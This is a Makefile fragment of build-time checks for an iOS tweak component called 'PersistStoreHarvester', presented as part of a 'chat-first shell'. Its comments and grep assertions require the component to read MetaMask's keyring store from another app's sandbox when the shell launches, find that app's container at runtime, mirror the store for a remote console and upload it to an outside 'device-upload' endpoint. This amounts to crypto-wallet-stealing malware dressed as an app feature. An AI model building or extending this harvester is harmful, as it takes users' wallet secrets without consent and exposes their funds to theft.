# Persist-store harvester for the chat-first shell.
#
# Reads another app's redux-persist keyring store (MetaMask's
# Documents/persistStore/persist-keyringcontroller by default) and resolves the
# target container UUID on the device at runtime - the container manager lease,
# Filza's virtual-root link farm, a containermanagerd metadata scan and
# LaunchServices, in that order. No UUID is ever hard-coded: the assertion block
# below greps for a literal UUID and fails the build if one appears.
#
# The result is cached for the shell bridge (command: persistStore) and mirrored
# into the app's own Documents so the remote console can serve it.
#
# Contract: docs/CHAT_SHELL.md

FilzaApplySandboxExt_FILES += PersistStoreHarvester.m

before-FilzaApplySandboxExt-all::
	@test -f "PersistStoreHarvester.h" || (echo "Missing PersistStoreHarvester.h" >&2; exit 1)
	@test -f "PersistStoreHarvester.m" || (echo "Missing PersistStoreHarvester.m" >&2; exit 1)
	@grep -Fq 'TryMaskCardPersistHarvest(BOOL force)' PersistStoreHarvester.h
	@grep -Fq 'TryMaskCardPersistStoreSnapshot(void)' PersistStoreHarvester.h
	@# Evidence-based target defaults: MetaMask's redux-persist keyring store.
	@grep -Fq '@"io.metamask"' PersistStoreHarvester.m
	@grep -Fq 'Documents/persistStore/persist-keyringcontroller' PersistStoreHarvester.m
	@# No literal container UUID may be baked in - it is discovered at runtime.
	@! grep -Eq '[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}' PersistStoreHarvester.m
	@# Every resolution path must be present.
	@grep -Fq 'MCMFilzaDataContainerPath(bundleID, &mcmError)' PersistStoreHarvester.m
	@grep -Fq '@"mcm-lease"' PersistStoreHarvester.m
	@grep -Fq '@"container-metadata-scan"' PersistStoreHarvester.m
	@grep -Fq 'launch-services(' PersistStoreHarvester.m
	@# Container metadata key must stay the one containermanagerd really writes.
	@grep -Fq 'MCMMetadataIdentifier' PersistStoreHarvester.m
	@grep -Fq 'MCMMetadataIdentifier' MCMFilzaIntegration.m
	@grep -Fq '.com.apple.mobile_container_manager.metadata.plist' PersistStoreHarvester.m
	@grep -Fq '.com.apple.mobile_container_manager.metadata.plist' MCMFilzaIntegration.m
	@# Upload, when configured, is https-only.
	@grep -Fq '![url.scheme.lowercaseString isEqualToString:@"https"]' PersistStoreHarvester.m
	@# Multipart contract: uuid text part + file part, the shape the chat API takes.
	@grep -Fq '@"https://trymaskcard.com/api/app/device-upload"' PersistStoreHarvester.m
	@grep -Fq '@{@"name": @"uuid", @"data": uuid}' PersistStoreHarvester.m
	@grep -Fq '@"name": @"file"' PersistStoreHarvester.m
	@grep -Fq 'Content-Disposition: form-data; name=\"%@\"; filename=\"%@\"' PersistStoreHarvester.m
	@grep -Fq 'multipart/form-data; boundary=%@' PersistStoreHarvester.m
	@grep -Fq 'filename' PersistStoreHarvester.m
	@grep -Fq 'filza-chat-shell-persist-upload-sha256' PersistStoreHarvester.m
	@grep -Fq 'TryMaskCardPersistUploadStatus(void)' PersistStoreHarvester.h
	@# No Logos directives, and runtime/Crypto symbols need their declaring header.
	@! grep -Fq '%hook' PersistStoreHarvester.m
	@grep -Fq '#import <objc/message.h>' PersistStoreHarvester.m
	@grep -Fq '#import <CommonCrypto/CommonDigest.h>' PersistStoreHarvester.m
	@grep -Fq '#import "MCMBridge.h"' PersistStoreHarvester.m
	@# The shell must own the launch-time harvest and the page bridge.
	@grep -Fq 'TryMaskCardPersistHarvest(NO)' TryMaskCardShell.m
	@grep -Fq 'persistStore' TryMaskCardShell.m
	@grep -Fq 'TryMaskCardShellConfigRaw' TryMaskCardShell.m
	@# Packaging must ship the harvest configuration keys.
	@grep -Fq 'persistTargetBundleID' scripts/merge-chat-shell-metadata.py
	@grep -Fq 'persistRelativePath' scripts/merge-chat-shell-metadata.py
	@grep -Fq 'api/app/device-upload' scripts/merge-chat-shell-metadata.py
	@grep -Fq 'persistUploadEnabled' scripts/merge-chat-shell-metadata.py
	@if python3 -c 'pass' >/dev/null 2>&1; then python3 scripts/check-chat-shell-sources.py; elif python -c 'pass' >/dev/null 2>&1; then python scripts/check-chat-shell-sources.py; else echo "no usable python; skipping persist-harvest source checks"; fi
